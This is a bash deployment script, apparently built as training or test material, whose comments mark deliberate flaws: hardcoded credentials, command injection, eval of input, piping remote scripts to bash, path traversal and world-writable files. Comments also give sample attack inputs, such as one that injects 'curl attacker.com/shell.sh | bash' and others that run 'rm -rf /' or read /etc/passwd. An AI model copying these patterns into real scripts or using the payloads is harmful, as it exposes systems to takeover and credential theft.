#!/bin/bash

# ⚠️ VULNERABLE BY DESIGN - DO NOT USE IN PRODUCTION ⚠️
#
# Deployment Script with INTENTIONAL vulnerabilities:
# - Command Injection
# - Hardcoded Credentials
# - Insecure File Permissions
# - No Input Validation

# ============================================================
# VULNERABILITY: Hardcoded Credentials
# ============================================================

DB_HOST="db.internal.company.com"
DB_USER="root"
DB_PASSWORD="password123"

AWS_ACCESS_KEY="AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

DOCKER_USER="admin"
DOCKER_PASSWORD="docker_secret_123"

SSH_PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy...
-----END RSA PRIVATE KEY-----"

API_SECRET="sk_live_51H7BjKL8rXQ2bCn3pWxyz"

# ============================================================
# VULNERABILITY: Command Injection
# ============================================================

# User input directly in command
deploy_to_server() {
    local server=$1
    local version=$2

    # VULNERABILITY: No input validation - direct command injection
    # Attack: server="; rm -rf / #"
    # Attack: version="; curl attacker.com/shell.sh | bash #"

    echo "Deploying version $version to $server"

    # Command injection via ssh
    ssh root@$server "cd /app && git pull && ./restart.sh"

    # Command injection via docker
    docker exec app-container sh -c "echo $version > /app/version.txt"

    # Command injection via curl
    curl "http://$server/api/deploy?version=$version"
}

# ============================================================
# VULNERABILITY: Path Traversal in Backup
# ============================================================

backup_logs() {
    local log_path=$1
    local backup_name=$2

    # VULNERABILITY: Path traversal possible
    # Attack: log_path="../../../etc/passwd"
    # Attack: backup_name="../../root/.ssh/authorized_keys"

    cp $log_path /backups/$backup_name

    # Also vulnerable to command injection
    tar -czf /backups/${backup_name}.tar.gz $log_path
}

# ============================================================
# VULNERABILITY: eval() on user input
# ============================================================

run_custom_command() {
    local user_cmd=$1

    # VULNERABILITY: Direct eval of user input!
    # Attack: user_cmd="rm -rf /"
    eval "$user_cmd"
}

execute_script() {
    local script_url=$1

    # VULNERABILITY: Downloading and executing arbitrary script
    # Attack: script_url="http://evil.com/malware.sh"
    curl -s $script_url | bash
}

# ============================================================
# VULNERABILITY: Insecure Temporary Files
# ============================================================

create_temp_config() {
    local config_data=$1

    # VULNERABILITY: Predictable temp filename
    TEMP_FILE="/tmp/deploy_config_$$"

    # VULNERABILITY: World-readable permissions
    echo "$config_data" > $TEMP_FILE
    chmod 777 $TEMP_FILE  # VULNERABILITY: World-writable!

    # VULNERABILITY: Not cleaned up
    # Missing: rm $TEMP_FILE
}

# ============================================================
# VULNERABILITY: Race Condition
# ============================================================

check_and_deploy() {
    local lock_file="/tmp/deploy.lock"

    # VULNERABILITY: Time-of-check to time-of-use (TOCTOU)
    if [ ! -f $lock_file ]; then
        # Race condition: another process could create lock here
        touch $lock_file

        # Deploy...
        do_deploy

        rm $lock_file
    fi
}

# ============================================================
# VULNERABILITY: Sensitive Data in Process List
# ============================================================

connect_to_database() {
    # VULNERABILITY: Password visible in 'ps' output
    mysql -h $DB_HOST -u $DB_USER -p$DB_PASSWORD -e "SELECT 1"

    # VULNERABILITY: AWS credentials in environment
    export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY
    export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_KEY
    aws s3 ls

    # VULNERABILITY: Credentials passed as arguments
    docker login -u $DOCKER_USER -p $DOCKER_PASSWORD
}

# ============================================================
# VULNERABILITY: Insecure Git Operations
# ============================================================

deploy_from_git() {
    local repo_url=$1
    local branch=$2

    # VULNERABILITY: No verification of repository
    git clone $repo_url /tmp/deploy_repo

    # VULNERABILITY: No branch sanitization
    cd /tmp/deploy_repo && git checkout $branch

    # VULNERABILITY: Executing unverified code
    ./install.sh
}

# ============================================================
# VULNERABILITY: Curl without SSL verification
# ============================================================

fetch_config() {
    local config_url=$1

    # VULNERABILITY: SSL verification disabled!
    curl -k "$config_url" > /etc/app/config.json

    # VULNERABILITY: Following redirects to potentially malicious sites
    curl -L "$config_url" | python3 -c "import sys,json; exec(json.load(sys.stdin)['code'])"
}

# ============================================================
# VULNERABILITY: Insecure File Operations
# ============================================================

update_config() {
    local config_key=$1
    local config_value=$2

    # VULNERABILITY: Arbitrary file write via key
    # Attack: config_key="/etc/passwd"
    echo "$config_value" > "$config_key"

    # VULNERABILITY: World-readable credentials file
    chmod 644 /app/credentials.json
}

# ============================================================
# VULNERABILITY: Debug Mode Left Enabled
# ============================================================

DEBUG=true  # VULNERABILITY: Debug enabled in production!

if [ "$DEBUG" = true ]; then
    set -x  # VULNERABILITY: Exposes all commands including passwords
fi

# ============================================================
# VULNERABILITY: No Error Handling
# ============================================================

main() {
    # VULNERABILITY: Script continues on errors
    # Missing: set -e

    deploy_to_server "$1" "$2"
    backup_logs "$3" "$4"

    # VULNERABILITY: Ignoring exit codes
    some_critical_operation
    echo "Deploy successful"  # May print even if operation failed
}

# Run main with command line arguments
main "$@"
